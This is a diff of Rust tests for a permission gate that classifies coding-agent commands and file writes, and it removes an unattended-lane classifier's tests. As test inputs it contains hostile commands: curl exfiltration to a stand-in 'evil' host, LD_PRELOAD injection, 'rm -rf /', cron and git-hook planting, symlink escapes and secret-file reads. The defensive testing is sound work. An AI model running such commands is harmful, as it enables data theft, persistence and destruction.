-    async fn insert_answer_event(pool: &sqlx::PgPool, thread_id: Uuid, actor: &MessageOrigin) {
-        let payload = serde_json::json!({
-            "actor": actor,
-            "answer": { "kind": "Selected", "option_id": "opt-0" },
-            "tool_use_id": Uuid::new_v4().to_string(),
-        });
-        sqlx::query(
-            "INSERT INTO events (id, aggregate, aggregate_id, event_type, payload, created, thread_id) \
-             VALUES ($1, 'thread', $2, 'UserQuestionAnswered', $3, NOW(), $2::uuid)",
-        )
-        .bind(Uuid::new_v4())
-        .bind(thread_id.to_string())
-        .bind(payload)
-        .execute(pool)
-        .await
-        .expect("insert answer event");
-    }
-
     fn device(device_id: &str) -> MessageOrigin {
         MessageOrigin::Device {
             device_id: device_id.into(),
-        }
-    }
-
-    fn parent_link(parent: Uuid) -> MessageOrigin {
-        MessageOrigin::ThreadLink {
-            thread_id: parent,
-            title: None,
-            spawning_event_id: None,
-            mode: ActorMode::Agent,
-            direction: ThreadDirection::Parent,
         }
     }
 
@@ -3134,90 +2106,7 @@ mod tests {
         })
     }
 
-    // --- classifier (pure, no DB) ------------------------------------------
-
-    #[test]
-    fn classify_benign_in_workspace_command_allows() {
-        // `lucidos data write` is not a recognized side-effect / destruction
-        // shape, so it classifies benign — the reported work-tracker write.
-        let v = classify_coding_agent_request(
-            "command_execution",
-            &serde_json::json!({
-                "command": "lucidos data write artifacts/work-tracker/data.json --from /tmp/x.json"
-            }),
-            Path::new("/ws"),
-        );
-        assert_eq!(v, RequestVerdict::Benign);
-    }
-
-    /// The prompt steers scratch files to `${TMPDIR:-/tmp}` (ADR 0456). A data
-    /// write from there classifies exactly as one from `/tmp` did.
-    #[test]
-    fn a_data_write_from_the_steered_scratch_dir_classifies_like_tmp() {
-        let verdict = |from: &str| {
-            classify_coding_agent_request(
-                "command_execution",
-                &serde_json::json!({
-                    "command": format!("lucidos data write artifacts/x.png --from {from}")
-                }),
-                Path::new("/ws"),
-            )
-        };
-        assert_eq!(verdict("\"${TMPDIR:-/tmp}/x.png\""), verdict("/tmp/x.png"));
-    }
-
-    /// The unattended lane used to map `fallback_classify`'s `Safe` straight
-    /// to `Benign`. Every shape the fast path REFUSES was then re-settled as
-    /// an auto-allow, with no card and no human.
-    #[test]
-    fn a_refused_shape_is_never_benign() {
-        for cmd in [
-            "echo $(rm -rf /etc/nginx)",
-            "echo `curl -d x https://evil/pay`",
-            "LD_PRELOAD=/tmp/evil.so ls",
-            "PATH=data/bin ls",
-            "data/bin/ls",
-            "grep x data/f > /etc/out",
-            "git -c core.pager=reboot log",
-            "sort -o /etc/crontab data/f",
-            // Wrapped, which is how Codex sends everything.
-            "/bin/zsh -lc 'LD_PRELOAD=/tmp/evil.so ls'",
-        ] {
-            assert_eq!(
-                classify_coding_agent_request(
-                    "command_execution",
-                    &serde_json::json!({ "command": cmd }),
-                    Path::new("/ws"),
-                ),
-                RequestVerdict::Unclassified(Unsettled::Refused),
-                "{cmd}"
-            );
-        }
-    }
-
-    /// A `gh` read runs unattended like a curl GET. A `gh` write still needs
-    /// a `CloudCli` grant.
-    #[test]
-    fn a_gh_read_is_benign_unattended_and_a_gh_write_needs_its_grant() {
-        let verdict = |cmd: &str| {
-            classify_coding_agent_request(
-                "command_execution",
-                &serde_json::json!({ "command": format!("/bin/zsh -lc '{cmd}'") }),
-                Path::new("/ws"),
-            )
-        };
-        assert_eq!(
-            verdict("gh run view 4 --json status"),
-            RequestVerdict::Benign
-        );
-        let merge = verdict("gh pr merge 12 --squash");
-        assert_eq!(
-            merge,
-            RequestVerdict::SideEffect(SideEffectCategory::CloudCli)
-        );
-        let (allowed, _) = decide_unattended(merge, &[SideEffectCategory::ExternalApi]);
-        assert!(!allowed);
-    }
+    // --- grant offers (pure, no DB) ----------------------------------------
 
     /// The offer a card stamps, per agent. A card persisted before the field
     /// existed still loads, and writes no key back.
@@ -3370,232 +2259,6 @@ mod tests {
         assert_eq!(offer.narrow.as_deref(), Some("Bash(./scripts/x.sh:*)"));
     }
 
-    /// The other half of the same decision. An UNRECOGNISED head is an
-    /// allowlist omission, not an evasion, and denying it would stop every
-    /// unattended coding-agent session from building or testing anything.
-    #[test]
-    fn an_unrecognised_head_still_runs_unattended() {
-        for cmd in [
-            "cargo build --release",
-            "npm test",
-            "make deploy",
-            "python script.py",
-            "git push origin main",
-            "rm -rf data/tmp",
-            "/bin/zsh -lc 'cargo test -p lucidos-engine'",
-        ] {
-            assert_eq!(
-                classify_coding_agent_request(
-                    "command_execution",
-                    &serde_json::json!({ "command": cmd }),
-                    Path::new("/ws"),
-                ),
-                RequestVerdict::Benign,
-                "{cmd}"
-            );
-        }
-    }
-
-    /// A relative delete or overwrite runs in the request's `cwd`. With that
-    /// outside the worktree, it destroys outside it, so it is grant-gated. The
-    /// overwrite settles Safe on the fast path, which never sees the `cwd`.
-    #[test]
-    fn a_request_cwd_outside_the_worktree_is_not_benign() {
-        for cmd in [
-            "rm -rf old",
-            "cd ~/Downloads && rm -rf old",
-            "echo x > .zshrc",
-            "/bin/zsh -lc 'echo x > .zshrc'",
-        ] {
-            let outside = serde_json::json!({ "command": cmd, "cwd": "/Users/me" });
-            assert_eq!(
-                classify_coding_agent_request("command_execution", &outside, Path::new("/ws")),
-                RequestVerdict::SideEffect(SideEffectCategory::OutOfWorkspaceDestruction),
-                "{cmd}"
-            );
-        }
-        for cmd in ["cat .zshrc", "echo x >> notes.log"] {
-            let read = serde_json::json!({ "command": cmd, "cwd": "/Users/me" });
-            assert_eq!(
-                classify_coding_agent_request("command_execution", &read, Path::new("/ws")),
-                RequestVerdict::Benign,
-                "{cmd}"
-            );
-        }
-        for cmd in ["rm -rf old", "echo x > out.txt"] {
-            let inside = serde_json::json!({ "command": cmd, "cwd": "/ws/data" });
-            assert_eq!(
-                classify_coding_agent_request("command_execution", &inside, Path::new("/ws")),
-                RequestVerdict::Benign,
-                "{cmd}"
-            );
-        }
-    }
-
-    /// Claude Code often moves into its own worktree by absolute path first.
-    /// That `cd` stays in the workspace, so the delete after it stays benign.
-    #[test]
-    fn a_cd_by_absolute_path_inside_the_worktree_stays_benign() {
-        for cmd in [
-            "cd /ws && rm -rf dist",
-            "cd /ws/crates/app && rm -rf target",
-        ] {
-            assert_eq!(
-                classify_coding_agent_request(
-                    "command_execution",
-                    &serde_json::json!({ "command": cmd }),
-                    Path::new("/ws"),
-                ),
-                RequestVerdict::Benign,
-                "{cmd}"
-            );
-        }
-        let temp = tempfile::tempdir().unwrap();
-        let workspace = temp.path().join("workspace");
-        let outside = temp.path().join("outside");
-        std::fs::create_dir_all(&workspace).unwrap();
-        std::fs::create_dir_all(&outside).unwrap();
-        assert_eq!(
-            classify_coding_agent_request(
-                "command_execution",
-                &serde_json::json!({ "command": format!("cd {} && rm -rf x", outside.display()) }),
-                &workspace,
-            ),
-            RequestVerdict::SideEffect(SideEffectCategory::OutOfWorkspaceDestruction)
-        );
-    }
-
-    /// A command request whose payload cannot be read is not a "not a command"
-    /// request. Collapsing the two fell through to the benign default.
-    #[test]
-    fn an_unreadable_command_payload_is_never_benign() {
-        for input in [
-            serde_json::json!({}),
-            serde_json::json!({ "command": null }),
-            serde_json::json!({ "command": 42 }),
-            serde_json::json!({ "command": "" }),
-            serde_json::json!({ "command": "   " }),
-        ] {
-            assert_eq!(
-                classify_coding_agent_request("command_execution", &input, Path::new("/ws")),
-                RequestVerdict::Unclassified(Unsettled::Unreadable),
-                "{input}"
-            );
-        }
-    }
-
-    #[test]
-    fn classify_external_api_command_is_side_effect() {
-        let v = classify_coding_agent_request(
-            "command_execution",
-            &serde_json::json!({"command": "curl -X POST https://example.com/api -d @data"}),
-            Path::new("/ws"),
-        );
-        assert_eq!(
-            v,
-            RequestVerdict::SideEffect(SideEffectCategory::ExternalApi)
-        );
-    }
-
-    #[test]
-    fn classify_email_command_is_side_effect() {
-        let v = classify_coding_agent_request(
-            "Bash",
-            &serde_json::json!({"command": "echo body | mail -s hi a@b.com"}),
-            Path::new("/ws"),
-        );
-        assert_eq!(v, RequestVerdict::SideEffect(SideEffectCategory::Email));
-    }
-
-    #[test]
-    fn classify_catastrophic_command_denied() {
-        let v = classify_coding_agent_request(
-            "command_execution",
-            &serde_json::json!({"command": "rm -rf /"}),
-            Path::new("/ws"),
-        );
-        assert_eq!(v, RequestVerdict::Catastrophic);
-    }
-
-    #[test]
-    fn classify_in_workspace_file_write_is_benign() {
-        let v = classify_coding_agent_request(
-            "file_change",
-            &serde_json::json!({"grant_root": "/ws/data/artifacts"}),
-            Path::new("/ws"),
-        );
-        assert_eq!(v, RequestVerdict::Benign);
-    }
-
-    #[test]
-    fn classify_out_of_workspace_file_write_is_side_effect() {
-        let v = classify_coding_agent_request(
-            "Write",
-            &serde_json::json!({"file_path": "/etc/cron.d/evil"}),
-            Path::new("/ws"),
-        );
-        assert_eq!(
-            v,
-            RequestVerdict::SideEffect(SideEffectCategory::OutOfWorkspaceDestruction)
-        );
-    }
-
-    #[test]
-    fn classify_relative_dotdot_file_write_is_side_effect() {
-        // A relative target that escapes the worktree via `..` must NOT slip
-        // through as benign — it's grant-gated out-of-workspace destruction.
-        let v = classify_coding_agent_request(
-            "Edit",
-            &serde_json::json!({"file_path": "../../etc/cron.d/evil"}),
-            Path::new("/ws"),
-        );
-        assert_eq!(
-            v,
-            RequestVerdict::SideEffect(SideEffectCategory::OutOfWorkspaceDestruction)
-        );
-    }
-
-    /// The unattended run that showed the bug: a main-check fix wrote its
-    /// e2e log where the system prompt steers it, and was auto-denied.
-    #[test]
-    fn classify_a_scratch_log_redirect_is_benign() {
-        let dir = tempfile::Builder::new().tempdir_in("/tmp").unwrap();
-        let d = dir.path().display();
-        for command in [
-            format!("cargo build > \"{d}/b.log\" 2>&1"),
-            format!(
-                "lucidos background-task run --poll --description \"flaky spec\" -- \
-                 './scripts/e2e-browser.sh --local drawer.spec.ts > \"{d}/rw.log\" 2>&1'"
-            ),
-        ] {
-            let v = classify_coding_agent_request(
-                "Bash",
-                &serde_json::json!({ "command": command }),
-                Path::new("/ws"),
-            );
-            assert_eq!(v, RequestVerdict::Benign, "{command}");
-        }
-        let linked = format!("ln -s ~/.zshrc {d}/a; cargo build > {d}/a");
-        assert_eq!(
-            classify_coding_agent_request(
-                "Bash",
-                &serde_json::json!({ "command": linked }),
-                Path::new("/ws"),
-            ),
-            RequestVerdict::SideEffect(SideEffectCategory::OutOfWorkspaceDestruction),
-        );
-    }
-
-    #[test]
-    fn classify_unknown_tool_is_benign() {
-        let v = classify_coding_agent_request(
-            "Read",
-            &serde_json::json!({"file_path": "/etc/passwd"}),
-            Path::new("/ws"),
-        );
-        assert_eq!(v, RequestVerdict::Benign);
-    }
-
     #[test]
     fn unwrap_shell_command_cases() {
         // The realistic Codex shape.
@@ -3629,65 +2292,24 @@ mod tests {
         assert_eq!(unwrap_shell_command("zsh script.sh"), "zsh script.sh");
     }
 
-    #[test]
-    fn classify_zsh_wrapped_side_effect_is_detected() {
-        // Codex wraps everything in `/bin/zsh -lc '…'`; the inner side-effect
-        // must still be seen (otherwise the grant check is bypassed).
-        let v = classify_coding_agent_request(
-            "command_execution",
-            &serde_json::json!({"command": "/bin/zsh -lc 'curl -X POST https://example.com -d @x'"}),
-            Path::new("/ws"),
-        );
-        assert_eq!(
-            v,
-            RequestVerdict::SideEffect(SideEffectCategory::ExternalApi)
-        );
-    }
-
-    #[test]
-    fn classify_zsh_wrapped_benign_is_benign() {
-        let v = classify_coding_agent_request(
-            "command_execution",
-            &serde_json::json!({
-                "command": "/bin/zsh -lc 'lucidos data write artifacts/work-tracker/data.json --from /tmp/x.json'"
-            }),
-            Path::new("/ws"),
-        );
-        assert_eq!(v, RequestVerdict::Benign);
-    }
-
-    #[test]
-    fn classify_zsh_wrapped_catastrophic_is_catastrophic() {
-        let v = classify_coding_agent_request(
-            "command_execution",
-            &serde_json::json!({"command": "/bin/zsh -lc 'rm -rf /'"}),
-            Path::new("/ws"),
-        );
-        assert_eq!(v, RequestVerdict::Catastrophic);
-    }
-
-    // --- attended command gate -----------------------------------------------
+    // --- command gate --------------------------------------------------------
 
     /// Run the gate with no judge handle, which is the static half alone. Every
     /// case below is one the static pass settles, so the missing handle is the
-    /// point rather than a shortcut. `command_guard_coding_agents` is off.
+    /// point rather than a shortcut. `coding_agent_auto_answer` is off.
     async fn escalation(tool_name: &str, input: serde_json::Value) -> bool {
         command_gate(tool_name, input, false).await
     }
 
-    async fn command_gate(
-        tool_name: &str,
-        input: serde_json::Value,
-        guard_coding_agents: bool,
-    ) -> bool {
-        attended_command_allowed(
+    async fn command_gate(tool_name: &str, input: serde_json::Value, auto_answer: bool) -> bool {
+        guard_allows_command(
             None,
             tool_name,
             &input,
             Path::new("/ws"),
             None,
             Uuid::new_v4(),
-            guard_coding_agents,
+            auto_answer,
             &TrustedHeads::NONE,
         )
         .await
@@ -3849,9 +2471,9 @@ mod tests {
         assert!(escalation("command_execution", zsh("grep sudo /etc/hosts")).await);
     }
 
-    /// An unrecognised head is the ambiguous middle. The unattended lane reads
-    /// it as benign; this gate does not, because an auto-allow rests on a
-    /// verdict rather than on silence.
+    /// An unrecognised head is the ambiguous middle. This gate does not read it
+    /// as benign, because an auto-allow rests on a verdict rather than on
+    /// silence.
     #[tokio::test]
     async fn an_unrecognised_head_cards_without_a_judge() {
         assert!(!escalation("command_execution", zsh("cargo build")).await);
@@ -4196,14 +2818,6 @@ mod tests {
             "a half-understood patch must still render a card"
         );
         assert_eq!(
-            classify_coding_agent_request(
-                "file_change",
-                &partly_readable_change_set("/ws/src/a.rs"),
-                Path::new("/ws")
-            ),
-            RequestVerdict::SideEffect(SideEffectCategory::OutOfWorkspaceDestruction),
-        );
-        assert_eq!(
             build_permission_summary("file_change", &partly_readable_change_set("/ws/src/a.rs")),
             "file_change",
             "naming only the half that parsed would read as a complete card"
@@ -4225,46 +2839,22 @@ mod tests {
             !worktree_write_auto_allowed("Write", &input, Some(&f.root)),
             "the card must be decided by file_path, not by a stray changes key"
         );
-        assert_eq!(
-            classify_coding_agent_request("Write", &input, Path::new("/ws")),
-            RequestVerdict::SideEffect(SideEffectCategory::OutOfWorkspaceDestruction),
-        );
     }
 
     #[test]
-    fn a_relative_change_path_is_unresolved_rather_than_assumed_in_workspace() {
-        // `path_outside_workspace` reads an unplaceable path as in-workspace,
-        // which is right for CC (its file tools require an absolute path) and
-        // inverted for a `file_change`: codex raises that approval BECAUSE the
-        // patch escaped its sandbox, so "assume it lands in the worktree" is
-        // the one conclusion its existence rules out.
-        let input = serde_json::json!({ "changes": [{ "path": "src/x.rs" }] });
-        assert_eq!(
-            classify_coding_agent_request("file_change", &input, Path::new("/ws")),
-            RequestVerdict::SideEffect(SideEffectCategory::OutOfWorkspaceDestruction),
-        );
-        // CC's own relative-path handling is untouched.
-        assert_eq!(
-            classify_coding_agent_request(
-                "Write",
-                &serde_json::json!({ "file_path": "src/x.rs" }),
-                Path::new("/ws")
-            ),
-            RequestVerdict::Benign,
-        );
-    }
-
-    #[test]
-    fn a_change_set_of_an_unknown_shape_is_not_classified_from_grant_root() {
+    fn a_change_set_of_an_unknown_shape_never_reaches_the_worktree_fast_path() {
         // `changes` present but not a list is a shape we did not understand.
-        // The security decision must not fall through to `grant_root` and treat
-        // that directory as the request's one known target.
+        // The fast path must not fall through to `grant_root` and treat that
+        // directory as the request's one known target.
+        let f = worktree_fixture();
+        let inside =
+            serde_json::json!({ "changes": "surprise", "grant_root": under(&f.root, "sub") });
+        assert!(!worktree_write_auto_allowed(
+            "file_change",
+            &inside,
+            Some(&f.root)
+        ));
         let input = serde_json::json!({ "changes": "surprise", "grant_root": "/ws/sub" });
-        assert_eq!(
-            classify_coding_agent_request("file_change", &input, Path::new("/ws")),
-            RequestVerdict::SideEffect(SideEffectCategory::OutOfWorkspaceDestruction),
-            "an in-workspace grant_root must not make an unreadable `changes` list benign"
-        );
         // The SUMMARY may still surface it. `grant_root` is a documented
         // last-resort key, and reaching it through the key scan makes no claim
         // that it is a file being edited. What must never happen is it arriving
@@ -4293,44 +2883,6 @@ mod tests {
     }
 
     #[test]
-    fn classify_flags_a_codex_change_set_touching_anything_outside() {
-        let ws = Path::new("/ws");
-        assert_eq!(
-            classify_coding_agent_request(
-                "file_change",
-                &file_change_input(&["/ws/src/a.rs", "/ws/data/b.md"]),
-                ws
-            ),
-            RequestVerdict::Benign
-        );
-        assert_eq!(
-            classify_coding_agent_request(
-                "file_change",
-                &file_change_input(&["/ws/src/a.rs", "/etc/cron.d/evil"]),
-                ws
-            ),
-            RequestVerdict::SideEffect(SideEffectCategory::OutOfWorkspaceDestruction),
-            "one out-of-workspace path grant-gates the whole patch"
-        );
-    }
-
-    #[test]
-    fn classify_grant_gates_a_codex_change_whose_paths_are_unknown() {
-        // Codex raises a file-change approval because the patch escaped its
-        // sandbox. Without the `changes` list, the only path key is
-        // `grant_root`, and it arrives null. The request would then classify as
-        // Benign and an unattended session would auto-allow it.
-        assert_eq!(
-            classify_coding_agent_request(
-                "file_change",
-                &serde_json::json!({ "item_id": "exec-1" }),
-                Path::new("/ws")
-            ),
-            RequestVerdict::SideEffect(SideEffectCategory::OutOfWorkspaceDestruction)
-        );
-    }
-
-    #[test]
     fn path_outside_workspace_cases() {
         let ws = Path::new("/ws");
         assert!(!path_outside_workspace("/ws/data/x", ws));
@@ -4344,8 +2896,7 @@ mod tests {
 
     /// The same symlink escape `path_inside_worktree` resolves for. A link
     /// inside the workspace pointing outside passes a purely lexical prefix
-    /// check, so the write lands outside and the unattended lane auto-allows
-    /// it.
+    /// check, so the write lands outside.
     #[test]
     #[cfg(unix)]
     fn path_outside_workspace_rejects_a_symlink_escape() {
@@ -4394,92 +2945,7 @@ mod tests {
         );
     }
 
-    /// Regression: an in-workspace file write was benign wherever it landed.
-    /// So an unattended session could write `Bash` into the grant file that
-    /// every later spawn reads. It could also plant a git hook that the
-    /// engine's next commit runs. Neither raised a card.
-    #[test]
-    fn a_write_into_engine_state_is_denied_unattended() {
-        let ws = Path::new("/ws");
-        let write = |path: &str| {
-            classify_coding_agent_request(
-                "Write",
-                &serde_json::json!({ "file_path": path, "content": "x" }),
-                ws,
-            )
-        };
-        for path in [
-            "/ws/.lucidos/cc-allowed-tools",
-            "/ws/.lucidos/agent-allowed-commands",
-            "/ws/.lucidos/bin/lucidos",
-            "/ws/data/.git/hooks/pre-commit",
-            "/ws/.lucidos/worktrees/thread-abc/.git",
-            "data/.git/config",
-            ".lucidos/cc-allowed-tools",
-            "/ws/.lucidos/worktrees/thread-abc/../../cc-allowed-tools",
-        ] {
-            assert_eq!(
-                write(path),
-                RequestVerdict::Unclassified(Unsettled::EngineState),
-                "{path}"
-            );
-            // Not even a grant for out-of-workspace writes covers it.
-            let grant = [SideEffectCategory::OutOfWorkspaceDestruction];
-            let (allowed, _) = decide_unattended(write(path), &grant);
-            assert!(!allowed, "{path} must not be auto-allowed");
-        }
-        for path in [
-            "/ws/data/artifacts/notes.md",
-            "/ws/.lucidos/worktrees/thread-abc/src/main.rs",
-            "/ws/.lucidos/tmp/scratch.json",
-            ".lucidos/tmp/scratch.json",
-            "/ws/data/.gitignore",
-        ] {
-            assert_eq!(write(path), RequestVerdict::Benign, "{path}");
-        }
-    }
-
-    /// The same check through a symlink: a link inside the workspace into the
-    /// engine's runtime directory reads as an ordinary path lexically.
-    #[test]
-    #[cfg(unix)]
-    fn a_symlink_into_engine_state_is_denied_unattended() {
-        let ws = tempfile::tempdir().expect("tempdir");
-        let runtime = crate::core::grants_dir(ws.path());
-        std::fs::create_dir_all(&runtime).expect("runtime dir");
-        std::fs::create_dir_all(ws.path().join("data")).expect("data dir");
-        std::os::unix::fs::symlink(&runtime, ws.path().join("data/link")).expect("symlink");
-        let target = ws.path().join("data/link/cc-allowed-tools");
-        assert!(writes_engine_state(&target.to_string_lossy(), ws.path()));
-        assert!(!writes_engine_state(
-            &ws.path().join("data/notes.md").to_string_lossy(),
-            ws.path()
-        ));
-    }
-
-    // --- decision matrix (pure, no DB) -------------------------------------
-
-    #[test]
-    fn decide_benign_allows_with_empty_grant() {
-        let (allowed, _) = decide_unattended(RequestVerdict::Benign, &[]);
-        assert!(allowed);
-    }
-
-    #[test]
-    fn decide_unclassified_denies_whatever_the_grant() {
-        for grant in [
-            &[][..],
-            &[SideEffectCategory::Other],
-            &[SideEffectCategory::ExternalApi, SideEffectCategory::Email],
-        ] {
-            for cause in UNSETTLED_CAUSES {
-                let verdict = RequestVerdict::Unclassified(cause);
-                let (allowed, reason) = decide_unattended(verdict, grant);
-                assert!(!allowed);
-                assert_eq!(reason, UNATTENDED_DENY_UNCLASSIFIED_REASON);
-            }
-        }
-    }
+    // --- grants and secrets (pure, no DB) ----------------------------------
 
     /// Secret reads by every coding-agent tool that can make one.
     fn secret_read_requests() -> Vec<(&'static str, serde_json::Value)> {
@@ -4510,29 +2976,6 @@ mod tests {
                 json!({ "pattern": "/home/u/.lucidos/pg-shared-password" }),
             ),
         ]
-    }
-
-    #[test]
-    fn a_secret_read_is_denied_unattended_whatever_the_grant() {
-        let every_grant = [
-            SideEffectCategory::Email,
-            SideEffectCategory::ExternalApi,
-            SideEffectCategory::CloudCli,
-            SideEffectCategory::OutOfWorkspaceDestruction,
-            SideEffectCategory::Other,
-            SideEffectCategory::SecretRead,
-        ];
-        for (tool, input) in secret_read_requests() {
-            let verdict = classify_coding_agent_request(tool, &input, Path::new("/ws"));
-            assert_eq!(
-                verdict,
-                RequestVerdict::SideEffect(SideEffectCategory::SecretRead),
-                "{tool}: {input}"
-            );
-            let (allowed, reason) = decide_unattended(verdict, &every_grant);
-            assert!(!allowed, "{tool}: {input}");
-            assert!(reason.contains(UNATTENDED_UNGRANTABLE_REMEDY), "{reason}");
-        }
     }
 
     #[test]
@@ -4594,7 +3037,7 @@ mod tests {
             serde_json::json!({ "command": "/bin/zsh -lc 'cat ~/.lucidos/secret-keys/db'" });
         for flag in [false, true] {
             assert!(
-                !attended_command_allowed(
+                !guard_allows_command(
                     None,
                     CODEX_COMMAND_TOOL,
                     &input,
@@ -4627,12 +3070,11 @@ mod tests {
         }
     }
 
-    /// The attended gate hands a trusted repo script to the judge. A grant
+    /// The command gate hands a trusted repo script to the judge. A grant
     /// covers it by path, and only when nothing runs before it: an earlier
-    /// segment could rewrite the script (ADR 0571). The unattended lane never
-    /// reads trust, so a path head still denies there.
+    /// segment could rewrite the script (ADR 0571).
     #[test]
-    fn a_trusted_repo_script_is_judged_granted_only_first_and_denied_unattended() {
+    fn a_trusted_repo_script_is_judged_and_granted_only_first() {
         let trusted =
             TrustedHeads::new([("./scripts/x.sh".to_string(), "scripts/x.sh".to_string())]);
         let codex = |script: &str| serde_json::json!({ "command": format!("/bin/zsh -lc '{script}'"), "cwd": "/ws" });
@@ -4654,10 +3096,6 @@ mod tests {
             &trusted,
             all
         ));
-        assert_eq!(
-            classify_coding_agent_request(CODEX_COMMAND_TOOL, &late, Path::new("/ws")),
-            RequestVerdict::Unclassified(Unsettled::Refused)
-        );
 
         let first = codex("./scripts/x.sh --check");
         let path_line = |p: &str| p == "Bash(./scripts/x.sh:*)";
@@ -4691,10 +3129,9 @@ mod tests {
 
     /// A bare `Bash` grant covers a command that only names or reads
     /// `.claude/` or `.git/`. Both shapes carded on every call once the engine
-    /// matched Bash grants itself (ADR 0634). A write there stays uncovered,
-    /// and its card offers no line.
+    /// matched Bash grants itself (ADR 0634).
     #[test]
-    fn a_bash_grant_covers_a_protected_path_mention_but_not_a_write() {
+    fn a_bash_grant_covers_a_protected_path_mention() {
         let bash = |p: &str| p == "Bash";
         for command in [
             "N=\"${TMPDIR:-/tmp}/handoff.md\"; cat > \"$N\" <<'EOF'\nSee `.claude/rules/dev-runtime.md`.\nEOF",
@@ -4715,14 +3152,56 @@ mod tests {
                 "{command}"
             );
         }
-        let write = serde_json::json!({ "command": "echo '{}' > .claude/settings.json" });
+    }
+
+    /// A write under `.claude/` or `.git/` is covered by the bare `Bash` line
+    /// only. A head grant, persisted or session, never covers it: `cat` with a
+    /// redirect could plant a git hook. Its card offers "Always allow" alone.
+    #[test]
+    fn only_a_bare_bash_grant_covers_a_protected_path_write() {
+        let granted = |set: &'static [&'static str]| move |p: &str| set.contains(&p);
+        let cmd = |c: &str| serde_json::json!({ "command": c });
+        for c in [
+            "for f in .claude/x; do awk '{print}' \"$f\"; done",
+            "echo x > .claude/y",
+            "cat x > .git/hooks/pre-commit",
+        ] {
+            for tool in [CLAUDE_CODE_COMMAND_TOOL, CODEX_COMMAND_TOOL] {
+                assert!(
+                    persisted_allow_covers(tool, &cmd(c), &TrustedHeads::NONE, granted(&["Bash"])),
+                    "bare Bash must cover {c} for {tool}"
+                );
+            }
+            let offer = grant_offer("Bash", &cmd(c), &TrustedHeads::NONE);
+            assert_eq!(offer.broad.as_deref(), Some("Bash"), "{c}");
+            assert_eq!(offer.narrow, None, "{c}");
+            assert_eq!(offer.session, None, "{c}");
+        }
+        let hook = cmd("cat x > .git/hooks/pre-commit");
         assert!(!persisted_allow_covers(
             "Bash",
-            &write,
+            &hook,
             &TrustedHeads::NONE,
-            bash
+            granted(&["Bash(cat:*)"])
         ));
-        assert_eq!(grant_offer("Bash", &write, &TrustedHeads::NONE).broad, None);
+        assert!(!persisted_allow_covers(
+            CODEX_COMMAND_TOOL,
+            &hook,
+            &TrustedHeads::NONE,
+            granted(&["Bash(cat:*)"])
+        ));
+        assert!(!session_allow_covers(
+            "Bash",
+            &hook,
+            &TrustedHeads::NONE,
+            granted(&["Bash(cat:*)"])
+        ));
+        assert!(!session_allow_covers(
+            CODEX_COMMAND_TOOL,
+            &hook,
+            &TrustedHeads::NONE,
+            granted(&["command_execution(cat:*)"])
+        ));
     }
 
     /// One session click must grant the command's own head, not the wrapper
@@ -4825,8 +3304,7 @@ mod tests {
         ));
     }
 
-    /// The three shapes a stored pattern must never reach, all of them the same
-    /// finding: `derive_allow_pattern` returns `None` at both persisted scopes.
+    /// The shapes a stored pattern must never reach.
     #[test]
     fn a_persisted_grant_never_reaches_what_claude_code_ignores() {
         let granted = |set: &'static [&'static str]| move |p: &str| set.contains(&p);
@@ -4844,15 +3322,14 @@ mod tests {
                 "a bare {tool} line must not cover its own request"
             );
         }
-        // A command writing under a protected path, under the broadest grant
-        // there is (ADR 0634).
+        // A command writing under a protected path, under its head's grant.
         for c in ["rm -rf .git/hooks", "echo '{}' > .claude/settings.json"] {
             assert!(
                 !persisted_allow_covers(
                     "Bash",
                     &cmd(c),
                     &TrustedHeads::NONE,
-                    granted(&["Bash", "Bash(rm:*)"])
+                    granted(&["Bash(rm:*)", "Bash(echo:*)"])
                 ),
                 "a protected-path command must still ask: {c}"
             );
@@ -4949,14 +3426,15 @@ mod tests {
             &TrustedHeads::NONE,
             granted(&["Bash"])
         ));
-        // Except the three exceptions: a secret read, a catastrophic command
-        // and a write under a protected path.
-        for c in [
-            "cat ~/.lucidos/secret-keys/db",
-            "rm -rf /",
-            "echo x > .git/hooks/pre-commit",
-            "touch .claude/settings.json",
-        ] {
+        // A protected-path write included.
+        assert!(persisted_allow_covers(
+            tool,
+            &codex("/bin/zsh -lc 'echo x > .git/hooks/pre-commit'"),
+            &TrustedHeads::NONE,
+            granted(&["Bash"])
+        ));
+        // Except the two exceptions: a secret read and a catastrophic command.
+        for c in ["cat ~/.lucidos/secret-keys/db", "rm -rf /"] {
             assert!(
                 !persisted_allow_covers(
                     tool,
@@ -5017,44 +3495,6 @@ mod tests {
         }
     }
 
-    #[test]
-    fn decide_catastrophic_denies_even_when_other_granted() {
-        let (allowed, _) =
-            decide_unattended(RequestVerdict::Catastrophic, &[SideEffectCategory::Other]);
-        assert!(!allowed);
-    }
-
-    #[test]
-    fn decide_side_effect_allows_only_when_granted() {
-        let (allowed, reason) = decide_unattended(
-            RequestVerdict::SideEffect(SideEffectCategory::Email),
-            &[SideEffectCategory::Email],
-        );
-        assert!(allowed);
-        assert_eq!(reason, UNATTENDED_ALLOW_GRANTED_REASON);
-
-        let (denied, _) = decide_unattended(
-            RequestVerdict::SideEffect(SideEffectCategory::Email),
-            &[SideEffectCategory::ExternalApi],
-        );
-        assert!(!denied);
-    }
-
-    /// An engine-started run has no trigger, so the reason must not claim one.
-    #[test]
-    fn an_ungranted_side_effect_reason_names_no_trigger() {
-        let (allowed, reason) =
-            decide_unattended(RequestVerdict::SideEffect(SideEffectCategory::Email), &[]);
-        assert!(!allowed);
-        assert!(
-            reason.starts_with(
-                "Auto-denied: this unattended coding-agent session has no side-effect grant for "
-            ),
-            "{reason}"
-        );
-        assert!(!reason.contains("under a trigger"), "{reason}");
-    }
-
     #[tokio::test]
     async fn cleanup_floor_precedes_broad_session_grants_on_coding_agent_gate() {
         use crate::test_support::{setup_test_db, teardown_test_db};
@@ -5076,7 +3516,6 @@ mod tests {
                 &pool,
                 &bus,
                 &pending,
-                &empty_trigger_configs(),
                 temp.path(),
                 None,
                 None,
@@ -5101,7 +3540,7 @@ mod tests {
             format!("gitdir: {}", gitdir.display()),
         )
         .unwrap();
-        let outcome = prompt_coding_agent_permission(&pool, &bus, &pending, &empty_trigger_configs(),
+        let outcome = prompt_coding_agent_permission(&pool, &bus, &pending,
             temp.path(), Some(&worktree), None, CodingAgentPermissionInput { thread_id,
                 tool_use_id: "own-worktree".into(), tool_name: "Bash".into(),
                 input: serde_json::json!({"command": format!("rm -rf {}", worktree.display()), "cwd": worktree})
@@ -5112,361 +3551,18 @@ mod tests {
         teardown_test_db(&db_name).await;
     }
 
-    // --- resolver (DB-backed) ----------------------------------------------
+    // --- prompt path (DB-backed) -------------------------------------------
 
+    /// The whole point of the gate, end to end: codex asks to escape its
+    /// sandbox for a process probe, and no card is raised.
     #[tokio::test]
